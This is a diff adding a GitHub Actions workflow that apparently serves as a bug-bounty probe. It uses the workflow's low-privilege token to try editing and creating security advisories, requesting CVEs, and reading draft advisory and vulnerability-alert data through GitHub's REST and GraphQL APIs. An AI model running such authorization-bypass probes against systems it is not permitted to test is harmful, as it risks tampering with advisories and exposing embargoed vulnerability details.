@@ -1,0 +1,36 @@
+name: advprobe2
+on:
+  workflow_dispatch:
+permissions:
+  contents: read
+  security-events: read
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - name: probe
+        env:
+          GHSA: GHSA-22w2-h2pj-f3v8
+        run: |
+          T="${{ secrets.GITHUB_TOKEN }}"
+          echo "== PATCH draft (low priv) =="
+          curl -s -o /tmp/p.json -w "code=%{http_code}\n" -X PATCH -H "Authorization: Bearer $T" -H "X-Bug-Bounty: artex-scan" -H "Content-Type: application/json" -d '{"summary":"hacked-by-lowpriv"}' "https://api.github.com/repos/mengcehn/artex-r3526-pub/security-advisories/$GHSA"
+          head -c 400 /tmp/p.json; echo
+          echo "== POST create advisory (low priv) =="
+          curl -s -o /tmp/c.json -w "code=%{http_code}\n" -X POST -H "Authorization: Bearer $T" -H "X-Bug-Bounty: artex-scan" -H "Content-Type: application/json" -d '{"summary":"lowpriv-created","description":"x","severity":"low"}' "https://api.github.com/repos/mengcehn/artex-r3526-pub/security-advisories"
+          head -c 400 /tmp/c.json; echo
+          echo "== POST cve request (low priv) =="
+          curl -s -o /tmp/v.json -w "code=%{http_code}\n" -X POST -H "Authorization: Bearer $T" -H "X-Bug-Bounty: artex-scan" "https://api.github.com/repos/mengcehn/artex-r3526-pub/security-advisories/$GHSA/cve"
+          head -c 400 /tmp/v.json; echo
+          echo "== GET published repo advisory of another public repo (low priv) =="
+          curl -s -o /tmp/a.json -w "code=%{http_code}\n" -H "Authorization: Bearer $T" -H "X-Bug-Bounty: artex-scan" "https://api.github.com/repos/aio-libs/aiohttp/security-advisories/GHSA-f9xw-jh8m-3mwq"
+          head -c 300 /tmp/a.json; echo
+          echo "== GET global advisory of draft (low priv) =="
+          curl -s -o /tmp/g.json -w "code=%{http_code}\n" -H "Authorization: Bearer $T" -H "X-Bug-Bounty: artex-scan" "https://api.github.com/advisories/$GHSA"
+          head -c 300 /tmp/g.json; echo
+          echo "== GraphQL securityAdvisory draft (low priv) =="
+          curl -s -o /tmp/q.json -w "code=%{http_code}\n" -X POST -H "Authorization: Bearer $T" -H "Content-Type: application/json" -d '{"query":"{ securityAdvisory(ghsaId: \"GHSA-22w2-h2pj-f3v8\") { ghsaId summary } }"}' "https://api.github.com/graphql"
+          head -c 500 /tmp/q.json; echo
+          echo "== GraphQL repository vulnerabilityAlerts (low priv) =="
+          curl -s -o /tmp/q2.json -w "code=%{http_code}\n" -X POST -H "Authorization: Bearer $T" -H "Content-Type: application/json" -d '{"query":"{ repository(owner:\"mengcehn\", name:\"artex-r3526-pub\") { vulnerabilityAlerts { totalCount } } }"}' "https://api.github.com/graphql"
+          head -c 500 /tmp/q2.json; echo
